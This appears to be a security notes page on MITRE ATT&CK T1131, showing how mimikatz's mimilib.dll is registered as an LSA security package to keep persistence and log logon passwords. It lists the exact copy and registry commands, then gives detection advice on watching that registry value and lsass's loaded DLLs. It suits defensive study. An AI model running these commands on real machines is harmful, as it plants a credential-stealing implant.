---
description: Persistence
---

# T1131: Authentication Packages

This technique abuses Windows Authentication Packages and injects a DLL into the LSA process. For this, mimikatz library mimilib.dll will be used. It will serve as a keylogger and save logon passwords next time someone will attempt a logon to the host.

## Execution

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
PS C:\> copy mimilib.dll %systemroot%\system32
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Check which LSA Security Packages are already on the list:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
    Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Add mimilb to the Security Support Providers:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```c
PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
Value Security Packages exists, overwrite(Yes/No)? y
The operation completed successfully.
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Observations

It may be worth monitoring `Security Packages` value in`hklm\system\currentcontrolset\control\lsa\` key for changes. Newly added packages should be inspected:

![](../.gitbook/assets/lsa-commandline.png)

The below shows the screens of the Security Packages registry value with the **mimilib** injected and the kiwissp.log file that shows a redacted password that had been logged that we typed in during the logon \(not shown in these screenshots nor the process was described\):

![](../.gitbook/assets/lsa-security-packages.png)

As expected, mimilib.dll can be observed in the list of DLLs loaded by the lsass.exe process. Make a baseline of loaded known good DLLs and monitor for any new DLLs:

![](../.gitbook/assets/lsa-loaded-dll.png)

{% embed url="https://github.com/veramine/Detections/wiki/LSA-Packages" %}

{% embed url="https://adsecurity.org/?p=1760" %}

{% embed url="https://attack.mitre.org/wiki/Technique/T1131" %}

